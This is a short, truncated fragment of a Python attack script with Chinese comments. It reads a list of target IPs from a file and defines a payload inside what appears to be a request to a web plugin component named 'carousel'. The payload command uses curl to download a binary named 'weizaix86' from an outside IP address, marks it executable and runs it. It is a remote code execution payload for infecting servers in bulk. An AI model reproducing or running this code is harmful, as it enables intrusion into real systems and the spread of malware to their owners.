...
# 读取IP文件
with open('/root/wpbba.txt', 'r') as file:
...
# 定义payload
payload_command = "echo 'WanLiChangChengWanLiChang';curl -O http://199.204.96.234:3232/weizaix86;chmod 777 weizaix86;./weizaix86"
payloads = [
    {
        "element": {
            "name": "carousel",
